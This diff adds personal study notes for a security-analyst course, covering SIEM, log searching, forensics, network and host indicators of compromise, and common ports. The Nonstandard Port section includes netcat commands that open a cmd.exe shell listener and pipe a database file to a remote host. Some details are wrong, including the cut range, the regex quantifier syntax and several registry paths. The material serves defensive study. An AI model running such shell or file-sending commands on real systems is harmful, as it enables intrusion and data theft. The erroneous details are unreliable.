@@ -1,0 +1,1300 @@
+SIEM
+
+-Log rieview critical part of security assurance
+
+-SIEM can be implemented as sw, hw, service
+
+-log all relevan events, filter irrelevant data
+-establish and document scope of events
+-develop use cases to define threat
+-plan incident response to an event
+-establish ticket process to track events
+-schedule regular threat hunting
+-provide auditors and analysts an evidence trail
+
+
+----
+
+Security Data Collection
+
+-Intelligence loses value over time
+-all alerting systems suffer false positives and negatives
+-false negative = exposed to a threat without being aware of them
+-false positive = overwhelm analysis
+-use cases to mitigate alert fatigue
+	-data sources with indicators
+	-query strings used to correlate indicators
+	-actions to occur when event triggered
+-use case should capture 5 W's
+	-when,who,what,where,where from
+
+----
+
+Data Normalization
+
+Different formats
+-proprietary binary formats
+-tab-separated
+-comma-separated
+-db log storage
+-syslog,snmp,xml,json
+-text-based
+
+-Can be normalized via agent, collectors/listeners
+
+-Parsing and normalization is used to interpret the data, which is what we call parsing, from all these different formats, and then standardize them into a single format for later analysis and processing
+
+-A connector or a plug-in is a piece of software that's designed to provide parsing and normalization functions to a particular SIEM
+
+-Correlating events and reconstructing timelines difficult without date/time sync
+-using Coordinated Universal Time, this uses a time standard, as opposed to a time zone
+
+-CIA for stored data
+
+
+----
+
+Event Log
+
+-event logs are logs that are created by your operating system on each and every client or server, to record how the users and the software interact with that system
+-format varies by OS
+
+-windows has 5 categories
+	-application,security,system,setup,forwarded events
+	-4 severity: info,warning,error,audit success/failure
+
+----
+
+Syslog
+
+-Syslog is a protocol for enabling different appliances and software applications to transmit their logs or event records to a centralized server
+- Syslog is going to follow a standard client-server model. And this is the de facto standard for logging of events from distributed systems across a network
+-syslog message contains a PRI code, header, message portion
+- PRI code is calculated from the data facility and severity level of data
+- header contains timestamp of the event and hostname
+- message portion has source process of the event and related content
+- relying on UDP can cause delivery issues, by default no encryption
+- newer implementation can use port 1468 (TCP), and TLS to encrypt, can use MD5 or SHA1 of authenticity and integrity,
+- NEW syslog called usually syslog-ng or rsyslog
+
+
+----
+
+SIEM Dashboards
+
+Analysts often work in a SOC or CSIRT
+-perform triage on alerts
+-review sec data sources
+-review cyber threat intelligence
+-perform vuln scanning
+-identify opportunities for threat hunting
+
+-security incidents is that they are identified and interpreted differently based on the overall threat level
+
+-it's important for you to select the right metrics for your dashboard
+
+KPIs - Key Performance Indicators
+- quantifiable measure that's used to evaluate the success of an organization, an employee, or other element in meeting objectives for performance
+	- # of vulns, of failed log-ons, of vuln systems, sec incidents, average response time, avrg time to resolve tickets, outstanding issues, employees trained, % of testing completed
+
+Dashboard to display needed info based on user's role
+
+
+----
+
+Analysis and Detection
+
+-need to dismiss FP, respond to true positives
+-conditional, heurestic, behavioral or anomaly analysis
+
+conditional
+- conditional analysis is a simple form of correlation that's performed by a machine using signature detection and rules-based policies
+- uses a signature or rule to generate alert
+	- IF x AND (y OR z)
+- creates lots of fp and cannot find 0-day or new TTPs
+
+heurestic
+- uses feature comparisons and likenesses rather than specific signature matching to identify whether the target of observation is really malicious
+- uses machine learning to help you alert on behavior that's similar enough to a signature or rule
+
+behavioral
+- a network monitoring system that detects changes in normal operating data sequences and identifies abnormal sequences
+- generate an alert whenever anything deviates outside of a defined level of tolerance from a given baseline
+- lot of FPs and FNs until its statistical model is adequately trained and tuned
+
+anomaly analysis
+-a network monitoring system that use as a baseline of acceptable outcomes or event patterns to identify events that fall outside an acceptable range
+- generate an alert on any event or outcome that doesn't follow a set pattern or rule
+-is going to use prescribed patterns, like an RFC or an industry standard. Something that everybody should be following. Now, behavioral analysis on the other hand records expected patterns in relation to the device being monitored
+
+
+Machine Learning
+-a component of AI that enables machines to develop strategies for solving a task, given a labeled dataset where features have been manually identified but without further explicit instructions
+
+
+----
+
+Trend Analysis
+
+-the process of detecting patterns within a dataset over time, and using those patterns to make predictions about future events or better understand our past events
+-review past events with a new perspective
+-impossible to identify a trend with a single logged event
+
+Frequency-based
+-establish a baseline for a given metric and then monitor the number of times that occurrence happens over a given period of time
+
+Volume-based
+- measure a metric based on the size of something such as how much disk space is being used or the log file size
+
+Statistical deviation
+- uses the concept of mean and standard deviations to determine if a data point should be treated as suspicious
+- "Mean" is basically the average. It's the sum of all the values divided by the number of samples
+
+-trend analysis is going to be very dependent on what metrics are used for your baseline and your measurement
+	- alerts and incidents
+	- time to respond
+	- network or host metrics
+	- training and education
+	- compliance
+	- external threat levels
+
+
+attackers will use a sparse attack technique to bury their attacks within the network noise
+
+due to lots of FPs, many analysts "tune down! their systems to be less sensitive
+
+trend analysis can be used to identify the sparse attack that was successful
+
+Narrative-based Threat Awarenewss and Intelligence
+-  a form of trend analysis that's reported in long-form prose to describe a common attack vector seen over time
+
+
+----
+
+Rule and Query Writing
+
+correlation rules
+- interpretation of the relationship between individual data points to diagnose incidents of significance to your security team
+- SIEM Correlation Rule
+	- a statement that matches certain conditions as expressed using logical expressions. We can use things like AND and OR or operators like the matches (==), < less than, > greater than, and in (contains) symbols 
+-  a rule that could be created to send an alert if multiple user logon failures occur within one hour from a single account.
+	- Error.LogonFailure > 3 AND LogonFailure.User AND Duration < 1 hour
+- correlation rule depend on normalized data
+- match data as it is ingested into a SIEM and require data in memory as presistent state data
+
+- SIEM Queries
+	- extract records from among all the data stored for review or to show it as a visualization
+	- Select (Some Fields), Where (Some Set of Conditions), Sorted by (Some Fields)
+
+----
+
+Searching and Piping Commands
+
+Creating SIEM correlation rule involves usually searching with strings
+
+Regex - Regular Expression
+-group of characters that describe how to execute a specific search pattern on a given text
+
+[...] matches a single instance of a character within the brackets
+
+\d single digit
+
++ matches one or more occurrences and is called a quantifier, such as \d+ matching one or more digits
+
+* matches zero or more, \d* matches zero or more digits
+
+? matches one or none times, \d? matches zero or one digits
+
+{} matches number of times, \d{3} matches 3 digits, \d{7-10} matches seven to ten digits
+
+(...) defines a matching group with a regex sequence, can be referred to by \1 for first group \2 for the second etc
+
+| 'pipe', "OR" logical operator to match "this or that"
+
+^ the regex will only match at the start of a line when searching
+
+$ the regex will only match at the end of a line when searching
+
+
+grep
+- a command on Unix, Linux, and macOS systems that involves simple string matching or regex syntax to search text files for a specific string
+
+-i (ignore case sensitivity)
+-v (return non-matching strings)
+-w (treat search strings as words)
+-c (return a count of matching strings only)
+-l (return names of files with macthing lines)
+-L (return names of files without matching lines)
+
+
+Windows has "find" for basic strings, "findstr" for regex search
+
+
+cut
+-command that specify which text on a line removed from the results
+
+"cut -c5 syslog.txt" = returns only the fifth character in each line from the syslog.txt file
+
+"cut -c5-5 syslog.txt" = only fifth through tenth charachters
+
+<cut -d" "-f1-4 syslog.txt> = returns the first four entries of each line as delimited by the " " (space character)
+
+
+sort
+- command that can change the output order
+
+# sort syslog.txt  = returns the contents of the file in alphabetical order (a-z)
+
+add "-r" for reverse order (z-a)
+
+-n with number order
+
+-k 2 = second column
+
+<sort -t "," -k 2 syslog.txt> = columns based on commas
+
+
+head
+- display 10 first lines of a file
+
+tail
+- last 10 lines of a file (in log file that means usually 10 newest lines)
+
+Piping (|)
+- process of using the output of one command as the input for a second command
+
+
+----
+
+Scripting Tools
+
+issuing commands individually, this can be useful, especially when you're doing one-time analysis, but by using scripting, this allow you to set up recurring searches, to be repeated easily, and you can even automate them
+
+Script
+- list of commands that are executed by a program or scripting engine
+	- bash, powershell, python, ruby, AWK
+
+Bash
+- scripting language and command shell for Unix-like systems
+- default shell for linux and macOS
+- supports variables, loops, conditional statements, functions etc
+- always starts with #!/bin/bash
+
+PowerShell
+- scripting language and command shell for Windows systems
+- supports variables, loops, conditional statements, functions, cmdlets that use Verb-Noun syntax
+
+WMIC - Windows Management Instrumentation Command-Line
+- program used to review log files on remote Windows machine
+- can be used inside PowerShell
+
+Python and Ruby
+- interpreted, high-level, general-purpose programming languages, and they're used heavily by cybersecurity analysts and penetration testers
+- not compiled so no binary file associated with them, so you can easily read the source code
+
+awk
+-a scripting engine that's geared towards modifying and extracting data from files or data streams inside Unix and Unix-like systems
+
+
+----
+
+
+Digital Forensics Analysts
+
+the process of gathering and submitting computer evidence to trial, and then interpreting that evidence by providing expert analysis
+
+-Forensic computer examiner
+-Digital forensic examiner
+-Computer forensic detective
+
+Use specialist tools and skills to recover info from systems, memory and storage
+
+Can be expert witness
+
+May fill a lot of different roles
+-Planning IT systems and processes
+-Investigate or reconstruct incident
+-investigate if crimes occurred
+-collect/protect evidence
+-determine if data was exposed
+-developing processes and tools
+-supporting ongoing audits
+
+----
+
+Forensics Procedures
+
+Written procedures
+- ensure that personnel handle forensics properly, effectively, and in compliance with the required regulations
+
+Identification
+- ensure the scene is safe, we have made sure we secure the scene to prevent any evidence contamination, and we identify the scope of the evidence to be collected
+
+Collection
+- ensure authorization to collect evidence is obtained, document and prove the integrity of evidence as it is collected
+
+Analysis
+- create a copy of this evidence and we're going to take that for analysis and we use repeatable methods and tools during the analysis
+
+Reporting
+- create a report of the methods and the tools that we used in our investigation and then, we also need to present detailed findings and conclusions based on that analysis
+
+
+Legal Hold
+- process that's designed to preserve all the relevant information when litigation is reasonably expected to occur
+
+A pc/server could be seized as evidence -> so you need a backups
+
+
+Have somebody from your organization appointed as your liaison, and that person should have legal knowledge and expertise so they can be the point of contact with law enforcement
+
+
+Ethics
+1. Analysis must be performed without bias
+2. Analysis methods must be repeatable by third parties
+3. Evidence must not be changed or manipulated (do everything on a copy)
+
+
+----
+
+Work Product Retention
+
+Contractual method of retaining or hiring a forensic investigator so that their analysis is protected from disclosure by the work product doctrine
+
+These principles of discovery and disclosure are going to govern the exchange of evidence between the prosecution team and the defense team in this civil or criminal trial
+
+Attorney may retain experts to perform the analysis
+- can decide if gives analysis to other side or not
+
+Work product doctrine limit contact with the company CSIRT team and they may not assist in the analysis
+
+Ensure the contract is between the attorney and the forensic analyst
+
+
+----
+
+Data Acquisition
+
+-method and tools used to create a forensically sound copy of the data from a source device such as system memory or a hard disk
+
+-BYOD policies complicate data acquisition
+
+-Some data can only be collected when the system is off
+
+-follow order of volatility
+	-cpu registers and cache memory
+	-RAM, routing tables, ARP cache, process table
+	-mass storage
+	-remote logging and monitoring data
+	-physical configration and network topology
+	-archival media
+
+Most Windows registry in the disk, some keys (like HKLM\Hardware) only stored in memory, so you should analyze the registry via a memory dump
+
+
+----
+
+Forensics Tools
+
+Digital Forensics Kit
+- kit containing the software and hardware tools required for us to acquire and analyze evidence from system, memory dumps, and mass storage file system
+- sw is designed to assist in collection/analysis
+
+EnCase
+- a digital forensic case management product that was created by guidance software, it uses built in pathways or workflow templates that will show you the key steps in many types of investigations
+
+
+The Forensic Toolkit (FTK)
+-a digital forensic investigation suite by AccessData, and it runs on Windows Servers or server clusters that allows for faster searching and analysis due to the way it does data indexing, whenever you import evidence
+
+
+The Sleuth Kit
+-an open source digital forensics collection of a lot of different command line tools and programming libraries for disk imaging and file analysis that interfaces with Autopsy as a GUI
+
+
+Forensic ws must have access to high-capacity diska array subsystem or storage area network (SAN)
+- no inet connection
+
+Analysis always take place on copies
+
+
+----
+
+Memory Acquisition
+
+System Memory Image Acquisition
+- a process that creates an image file of the system memory that can be analyzed to identify the processes that were running, the contents of temporary file systems, registry data, network connections, cryptographic keys, and much more
+
+Live acquisition
+- capture memory while pc running with hw/sw tools
+- Memoryze from FireEye, F-Response TACTICAL
+- need to be pre-installed, across enterprise
+
+Crash Dump
+- memory written to a dump file when Windows encounter unrecoverable kernel error
+- usually mini dump file, may contain valuable info and evidence
+
+Hibernation File
+- file written to disk when WS is put in sleep state
+- some malware can detect sleep state, will try to hide
+
+Pagefile
+- file that stores memory when RAM is ran out
+
+
+Live acquisition generates snapshot of data that is changing second by second
+
+Can find
+-processes, pw hashes, crypto keys, refistry keys, cached files, strings from open files
+-all useful
+
+
+---
+
+Disk Image Acquisition
+
+a process that creates an image file of the system's disks, and these can then be analyzed to identify current, deleted, and hidden files on a given disk
+
+Can be done as 
+
+Live acquisition
+-capture while computer is still running (good if drive encrypted)
+-contents could change during acquisition
+
+Static acquisition by shutting down
+-graceful shutdown, then acquire disk
+-some malware can detect shutdown
+
+Static acquisition by pulling the plug
+-unplug PC immediately
+-malware doesnt have chance to hide
+-risk of corrupting data
+
+
+Physical and logical acquisition
+- Physical is bit-by-bit copy, includes every non-bad sector and hidden/deleted data
+	-takes time if lots of TB
+- Logical copies files and folders from partitions using the file system table stored on the media
+	-faster, but some files will be missed (like marked deleted files)
+
+
+Write Blockers
+- tool to prevent device/ws from changing data on disk/media
+- can be hw or sw
+- hw better
+
+Imaging Utilities
+-sw utility that conducts the disk imaging of a target
+-many will also perform crypto hashing of the data -> integrity
+-different formats (.e01,.aff,.dd)
+
+
+dd
+-cli-tool for unix/linux/macos
+
+Virtual hard drive will already be in a vmdk, vhd/vhdx, vdi format
+- will have everything you need right there
+
+
+----
+
+Hashing
+
+SHA - Secure Hash Algorithm
+-  a cryptographic hashing algorithm that was created to address the possible weakness in older algorithms, like the MD5 hashing algorithm
+- 160-bit digest, but not strong
+- SHA2 - 256 or 512-bit hash
+- MD5 - message digest algorithm, 128-bit = collisions
+
+Windows
+-certutil (built-in windows command)
+-File Checksum Integrity Verifier (fciv)
+-md5sum,sha1sum,sha256/512sum (Linux)
+
+Hashing can be used to prove file integrity of OS and app files
+
+FIM - File Integrity Monitoring
+- a type of software that reviews your system files to ensure they haven't been tampered with
+
+
+----
+
+Timeline genration
+
+Timeline
+-a tool that will show the sequence of filesystem events within a source image, in a graphical format
+
+Report analysis
+-how was access to the system obain?
+-What tools installed?
+-What changes to files made?
+-What data retrieved?
+-Was data exfiltrated?
+
+Many forensics tools can generate timeline based on your evidence
+- you can create your own if sw can't - like in excel
+
+
+----
+
+Carving
+
+HDD/SSDs divided into sectors, 512 bytes (standard), 4096 (advanced)
+
+Block/cluster
+-smallest unit file system can address (default is 4096 bytes)
+
+MFT - Master File Table
+- contains metadata with location of each file in terms of blocks/clusters for disks in NTFS format
+
+File deletion doesnt DELETE the file, only the reference in the table (metadata)
+
+File carving
+-process of extracting data from pc when data has no associated file system metadata
+-attempts to piece together data fragments from unallocated and slack space to reconstruct deleted file or parts of them
+
+Scalpel
+-open-source cli-tool part of The Sleuth Kit, for linux/windows
+
+
+----
+
+Chain of Custody
+
+The record of evidence history from collection to presentation in court, all the way through to disposal
+
+Specialized evidence bags used for electronic media that ensures they are not damaged or corrupted by electrostatic discharges (ESD)
+
+Criminal cases or internal sec audits can take months/years to resolve
+- amount of evidence collected can become extremely large
+- need to organize it
+	- metadata
+	- proper labels
+	- safe place
+
+----
+
+
+Traffic spikes
+
+-sharp increase in connection requests VS baseline
+
+DDoS
+- an attack that uses multiple compromised hosts, usually bots or zombies inside of a botnet, to overwhelm a service with request or with response traffic
+- a DDoS can really overwhelm even the most well-defended networks
+through the sheer volume of traffic that they're going to be exposing you to
+-unexpected surge in traffic from inet host -> infication of DDoS
+-excessive TIME_WAIT connections + lots of HTTP 503 (Service Unavailable) could also indicate DDoS occurring
+
+If large amount of outbound traffic, could indicate YOU'R network contains hosts used in DDoS against others
+
+How to measure DDoS?
+- bandwidth consumption, value of bytes sent/received or as a percentage of the link utilization
+
+DRDoS - Distributed Reflection DoS 
+-network based attack, attacker increases the bandiwdth sent to a vic during a DDoS by implementing an amplification factor
+-attacker spoofs victim's IP address and tries to open connections with multiple servers
+
+Amplification attacks can use different protocols
+-icmp, dns, ntp
+
+Bogus DNS query is an effective way to send a small req and require a server to provide a lot of info
+
+Single NTP request can generate a response with a list of the last 600 machines the server contacted
+
+Website can crash because coming famous > not DDoS attack
+-unexpected server load
+
+Slashdot Effect (slashdotting)
+-causing a website to crash when a smaller website can become very popular very quickly due to exposure on some kind of a social sharing site like Slashdot, Reddit, or Twitter
+
+
+How to mitigate DDoS attack?
+1. real-time log analysis, redirect suspicious traffic to black/sinkhole
+2. use geolocation and IP rep data to redirect or ignore sus traffic
+3. aggressively close slower connections, reduce timeouts
+4. use caching and backend infra, offload processing 
+5. utilize DDoS protection service (Cloud Flare / Akamai)
+
+
+----
+
+Beaconing
+
+A means for a network node to advertise its precense and establish link with other nodes
+- can be legit, like WAP's or applications
+- malicious is telling "i'm alive, still a bonet"
+
+-NTP, autoupdate systems, cluster services
+	-all use beaconing / heartbeat
+
+Jitter
+- attackers use random delay to frustrate indicators based on regular connection attempt intervals
+
+Sparse delivery
+- reduce packet size and hide in the noise of traffic
+
+C2 must issue commands to zombies
+-IRC
+	-in decline, orgs block it usually
+-HTTP /HTTPS
+	-mitigation: use intercepting proxy at edge (MITM)
+-DNS
+	-no need for direct connection to internet, instead use local DNS resolver
+- IOC 1. same query repeated several times
+- IOC 2. commands sent within requests or response queries will be longer and more complicated than normal
+- Evasion: attacker breaks message into several querys chunks
+-social media
+	- allows attacker to live off the land
+-Cloud services
+	- one botnet used Googles App Engine platform to send C&C msg through a hosted custom application
+	- easy to set up
+-Metadata
+	- data that describes and gives info about other data
+	- can hold attackers command and control msg
+
+----
+
+Irregular P2P Communication
+
+- irregular peer-to-peer, or P2P communications, an attack indicator where hosts within a network establish connection over unauthorized ports or data transfers
+- to/from client and server predominant traffic, p2p indication of attack
+- SMB (Server Message Block) commonly used by attacker
+- client <-> client traffic suspicious
+
+ARP Spoofing or Poisoning
+-occur when an attacker redirects an IP address to a MAC address that was not intended as its destination
+-can cause irregular p2p comms as well
+-IDS can identify sus traffic patterns, more ARP traffic than norm
+
+
+----
+
+Rogue Devices
+
+unauthorized device or service such as a wireless access point, a DHCP server or a DNS server, that's on a corporate or private network that allows unauthorized individuals to connect to that network
+
+-Network devices are identified using hw interface MAC and IP
+-Mitigation: use digital certs on endpoints and servers to authenticate and encrypt traffic with IPSec or HTTPS
+
+Rogue System Detection
+-identifying and removing rogue devices
+
+What is considered rogue system?
+- network taps
+	- physical device attached to cabling to record packets passing
+- WAPs
+-Servers
+	- can be set as a honeypot to harvest data
+-Wired/wireless client
+	-personal laptop
+	-authorized client device used unauthorized way
+-Software
+	-could be malware, spyware etc.
+-VMs
+	-create rogue servers and services in virtual environment
+-Smart Appliances/devices
+	
+Rogue device detection
+- Visual Inspection of Ports and Switches
+	- watch for fake asset tags
+- Conduct Network Mapping and Host Discovery
+	- enumeration scanners can identify hosts via banner grabbing or fingerprinting devices
+- Wireless Monitoring
+	- wireless sniffing and discovery > find unknown/unauthorized SSIDs
+- Packet Sniffing and Traffic Flow
+	- see unauthorized protocols and unusual p2p comm flows
+- NAC and Intrusion Detection
+	- security suites and appliances can combine automated network scanning > and prevent rogue devices accessing network
+
+
+----
+
+Scans and Sweeps
+
+-Rogue devices begin attack with scan and sweep > find vuln hosts
+-Fingerprinting, identifying type and version of OS by its response to network scan
+-Sweep, scan directed at multiple IPs > see who responds
+-Footprinting, attacker gathers info before attacking
+-authorized network scans should come from restricted range
+-IDS identify scanning by seeing SYN,SYN/ACK,FIN packets are not statistically balanced
+
+
+----
+
+Nonstandard Port Usage
+
+-IANA maintains a list of well known and registered TCP and UDP port mappings
+- well known 0-1023 ports
+- registered port 1024-49151
+- dynamic ports 49152 - 65535
+- legit apps use well-known and registered ports
+- if unknown open dynamic port constantly open on a host > IOC
+- Non-standard Port, HTTPS in not 443 port
+- IOC 1: use of non-standard port, like DNS in != 53
+- IOC 2: mismatched port/application traffic
+- mitigation
+	-1 configure FW to allow only whitelisted port on in/outgress
+	-2 documentation to show which server ports allowed etc
+	-3 configure detection rules to detect mismatched usage
+
+Shell
+-when attacker opens listening port that exposes the command prompt on the local host and connect to that port from a remote host
+
+Reverse Shell
+-attacker opens a listening port on remote host and causes the infected host to connect to it
+-used to exploit orgs that don't filter outbound traffic
+
+Netcat (nc)
+-read/write raw data over network connection
+-often used as a listener for remote shells
+-setup a Listener # nc -l -p 443 -e cmd.exe
+-connect to Listener # nc 10.1.0.1. 443
+-can be used with scripting or redirection to send/receive files
+-setup a Listener to Receive # nc -l -p 53 > database.sql
+-send file to Listener # type database.sql | nc 10.1.0.21 53
+
+
+----
+
+TCP Ports
+-21 ftp
+-22 ssh or SFTP
+-110 POP3
+-111 RPCBIND, maps Remote Procedure Call services to port in *nix
+-135 MSRPC, RPC services in Windows
+-139 Netbios-SSN, File Sharing with pre-win 2000 versions
+-143 IMAP
+-445 Microsoft-DS,  win file sharing over SMB
+-993 IMAPS
+-995 POP3S
+-1723 PPTP, legacy VPN
+-3306, MySQL
+-5900, VNC Virtual Network Computing (like RDP)
+-8080 HTTP-proxy or alternate port for HTTP
+
+----
+
+UDP Ports
+-53 DNS fo Queries, TCP53 is for zone transfers
+-67 DHPCS server port for DHCP
+-68 DHCPC client port for DHCP
+-69 TFPT, Trivial File Transfer Protocol
+-135 MSRPC
+-137 NETBIOS-NS, win file sharing pre 2000
+-138 NetBIOS-DGM, datagram service, supports file sharing
+-139 Netbios-SSN, session service
+-161 SNMP
+-162 SNMP Management station port for receiving SNMP trap msg  
+-445 Microsoft-DS,  win file sharing over SMB
+-500 ISAKMP, Internet Security Association and Key Management Protocol used to set up IPSec tunnels
+-514 syslog
+-520 RIP Routing Information Protocol, old 
+-631 IPP, Internet Printing Protocol
+-1434 MS-SQL
+-1900 UPNP, for autoconfiguration of port forwarding for consoles etc.
+-4500 NAT-T-IKE
+
+
+---
+
+Data Exfiltration
+
+-process when attacker takes data from private to external network
+-done over many type of channels
+
+Http HTTPS
+-attacker uses commercial file sharing services to upload data from vic (dropbox etc)
+
+HTTP requests to DB services
+-use SQL injection or similiar to copy records from db
+-IOC: spike in PHP file requests, unusually large HTTP response
+
+DNS
+-use queries to transmit data
+-IOC: query used as TXT, MX, CNAME, NULL
+
+Overt Challens
+-use FTP, instant messaging, p2p, email etc.
+
+Explicit Tunnels
+-SSH or VPN
+-IOC: atypical endpoints involved in tunnels due geo-location
+
+Attacker can use different channel for data exfiltration than for command&control
+
+Best Mitigation: strong encryption at rest and transit
+
+
+----
+
+Covert Channels
+
+-communications path that allows data to be sent outside of the network without alerting any intrusion detection or data loss countermeasures
+
+-Transmit data over non-standard port
+-encoding data in TCP/IP packet headers
+-Segmenting data into multiple packets
+-Obfuscating data using hex
+-Transmitting encrypted data
+
+Mitigation
+-Advanced IDS or UBA tools can detect these possibly
+
+Covert Storage Channel
+-utilize one process to write to storage, another process to read from that location
+
+Covert Timing Channel
+-one process to alter system resource so that changes in tis response time can signal information to a recipient process
+
+Hybrid= Covert storage + timing channel
+
+Data loss countermeasures may inspect outgoing data packets but may be fooled by steganography
+
+
+----
+Malicious Processes
+
+How to tell?
+-first create baseline
+-use tools to track and report on processes
+
+Process executed without authorization fo the purpose of damaging or compromising the system
+-malware code often injected/shimmed into host process making it load malware code as a dynamic link librady (DLL) within Win
+
+Abnormal Process Behavior
+-indication that legit process corrupted with malicious code
+
+Windows Tools
+-sfc system file checker
+-Process Monitor, Process Explorer, tasklit, PE Explorer
+
+Linux Tools
+-pstree, ps
+-Daemon, background service in the Linux OS httpd, shhd...
+	-systemd, init daemon in Linux that is first executed by the kernel durin boot up, always PID 1
+-Pcoress Identification (PID)
+-Parent PID
+	-number of the parent process for every process launched
+
+pstree
+-command provides the parent/child relationship of the processes
+
+ps
+-lists attributes of all current processes
+- only shows processes started by the current user by default
+- #ps -A or #ps -e 
+	- will provide full list of all processes / for all users
+- #ps -C cron
+	- display the process for the cron command
+- #ps -A | sort -k 3
+	- display the process sorted by the third column
+
+Malware often uses injection into Linux shared libraries (Shared Object or .so files)
+
+ 
+----
+
+Memory Forensics
+
+-Fileless malware executes from memory, not saving to filesystem
+-Fileless Detection Techniques, require analysis of system memory content and process behaviour, not scanning filesystem
+
+
+Memory analysis tool
+- reverse engineer code, discover how process interact with file system (handles) and registry, examine network connections, retrieve crypto keys, extract strings
+
+The Volatility Framework
+- open-source memory forensics tool that has many different modules for analyzing specific elements of memory, such as web browser module that looks at your history, command prompt history modules that will look at your command prompt history and others
+
+Memoryze
+-done by FireEye
+
+----
+
+Consumption
+
+Resource consumption key indicator of malicious activity, can also be caused by legit sw
+
+-CPU usage
+-Memory consumption / per process level
+
+Look at baseline first
+
+free (linux)
+-command outputs summary of amount of used and free memory
+
+top
+-command gives info like Task Manager
+-#htop is newer, allows mouse etc utilities like sorting
+
+Memory overflow
+-exploit vuln in application to execute code or to crash the process
+-run the code in sandboxed debugging
+-by signature created by exploit code, analyst can detect it
+
+
+----
+
+Disk And File System
+
+-Even fileless malware can leave metadata on the file system
+
+Staging Areas
+-place where attacker begins to collect data for exfiltration, like tmp folders, user profile locations, data mased as logs, alternate data streams (ADS), or recycle bin
+-data often compressed and encrypted
+
+File System Viewers
+- tool allows to search file system for keywords quickly, including system areas like Trash, NTFS shadow copy and system volume information
+
+Analyzing file metadata > reconstruct timeline of events
+
+dir - Windows command has some advanced functions
+- #dir /Ax, filters all file/folder types that match the given parameter, such as dif /AH displays only hidden files and folders
+- #dir /Q, display info who owns each file, and stndr info
+- #dir /R, display alternate data streams for a file
+
+-hdd getting full, may indicate caching files for exfiltration
+
+Disk utilization tools can scan a file system and retrieve comprehensive statistics
+-visual representation
+-directory listing
+-real-time usage of data being written
+
+Linux File System Analysis Tools
+-lsof
+	-retrieve all the files that currently open
+	-quickly get list of all resources a process using
+-df
+	-retrieves how much disk space used and free by all mounted file systems
+-du
+	-how much each directory is using
+
+Cryptographic Analysis Tools
+-tools to determine type of encryption algo used and assess the key strength
+-as analyst must recover or brute force the user pw to obtain the decryption key for encrypted volume
+
+
+----
+
+Unauthorized Privilege
+
+Privilege Escalation
+-exploit OS flaws to gain higher level of access than intended
+
+How to detect?
+-monitor authentication and authorization systems
+	- unauthorized sessions
+	-failed logons, new accounts, guest account usage
+	- off hours usage
+
+Microsoft Policy Analyzer
+-can identify if policy deviates from config baseline
+
+AccessChk / AccessEnum
+-Sysinternals
+-can analyze privileges applied to file or resource
+
+
+----
+
+Unauthorized Software
+
+- can include legit sw, no permission to install
+- attacker can modify normal file for malicious use, like host file
+- most forensics toolkits can view app usage/history
+
+Prefetch Files
+-files that record the names of applications that have been run, as well as the date and time, the file path, the run count, and the DLLs that were used by the executable
+
+Shimcache
+-an application usage cache that is stored as a registry key
+	-HKLM\SYSTEM\CurrentControlSet\Control
+\SessionManager\AppCompactCache\AppCompactCach
+
+Amcache
+- an application usage cache that's stored as a hive file
+	- C:\Windows\appcompact\Programs\Amcache.hve
+
+
+----
+
+Unauthorized Change/Hardware
+
+-any change made to config, sw, hw, without proper authorization or change management process
+
+USB firmware can be reprogrammed to make the device look like another device class
+
+
+----
+
+Persistence
+
+Ability to maintain covert access to target host/network
+-usually relies on modifying reigtry or scheduled tasks
+
+Registry
+- a hierarchical database that stores low-level settings for Microsoft Windows inside that operating system and for the kernel itself, device drivers,  services, security accounts manager, and the user interface
+
+Win regedit
+-doesn't display the last modification time by default
+- dont use this
+
+regdump
+-tool that dumps the contents of the registry into a text file with simple formatting so that you can search for specific strings within that file using the find command
+
+grep
+-search the contents if analyzing on linux
+
+Windows has two types of autorun keys
+- Run and RunOnce
+	- Run autorun key, this is going to initialize its values asynchronously
+	- RunOnce, this is going to initialize its values in order when loading them from the registry
+- can be found
+	- HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+	- HKLM\SOFWARE\Microsoft\Windows\CurrentVersion\RunOnce
+	- HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+	- HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+
+another common tactic used by malware is to modify the registry entries for the system's running drivers and services. And these are found in HKLM\SYSTEM\CurrentControlSet\Services
+
+Malware can change file associations for EXE,BAT,COM, CMD
+- HKEY_CLASSES_ROOT under HKCR
+- HKEY\SOFTWARE\Classes
+- HKCU\SOFTWARE\Classes
+
+Registry entries for recently used files
+-HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+
+Compare current version to BASELINE
+
+
+Windows Task Scheduler
+- look for indicators and history
+- may be able to capture the history of non-system services, as well, like malware that's installing itself as its own service
+
+crontab (linux)
+- linux equivalent for windows task scheduler
+- #crontab -l, shows current cron jobs scheduled
+
+
+
+Anomalous Activity
+
+Need to look at
+-web applications
+-databases
+-DNS services
+-Remote Access Servers
+
+Symptoms include strange log entries, excessive per-process ports / resource consumption, unusual user accounts
+
+-unexpected outbound comm, output or service defacement
+
+----
+
+Service Interruptions
+
+-application interruption caused by a service either failing to start or halting abruptly
+-app service may fail for number of reasons
+-check logs
+
+-sec services are prevented from running
+-process running the service compromised
+-service is disabled by DDoS/DoS
+-excessive bandwidth usage is disrupting a service
+
+Service Analysis Tools for Windows
+-help identify suspicious activity even if AV couldn't find it
+-TaskManager
+-Services.msc
+-net start, displays all running services
+-get-service in powershell
+
+Linux tools
+-cron, task scheduler / at machine startup
+-systemctl, can list and monitor startup processes using the appropriate control for the init daemon
+-ps, top
+
+---
+
+Applications Logs
+
+DNS Event Logs
+-each time DNS server handles reques to convert dn to IP
+
+HTTP Access Logs
+-containing HTTP traffic that encountered error or that matches some pre-defined rule set
+-common log format (CLF) or W3C extended format
+-status codes (client base 400-range, server base 500)
+-User-Agent Field, the type of application making the request
+	-web-browser or clients OS
+
+FTP Access Logs
+-ftp traffic events in W3C extendet log format
+
+SSH Access Logs
+-unstandardized, can provide basic client/server session info
+- UID=0 is root
+
+SQL Event Logs
+-event/error log, records fields like date, time , action taken, server startup, individual db startup, db cache clearing, db not starting or shutting down unexpectedly
+-SQL servers, can log individual query string sen to db
+	-query operation performed
+	-schema associated with the operation
+	-object of the query
+
+----
+
+New Accounts
+
+-rogue accounts > method to mainain access
+-account creation should be monitored + change-controlled process to mitigate rogue accounts
+
+Account and Session MAnagement Tools
+-Local Users and Groups
+	-win tool
+-AD users and computers
+	-win tool in DC
+-net, WMIC (Windows Management interface Command-line), PShell
+- Linux
+	- who, shows logged in users, TTYs (terminal teletypes) they have active for each running process, login date/time
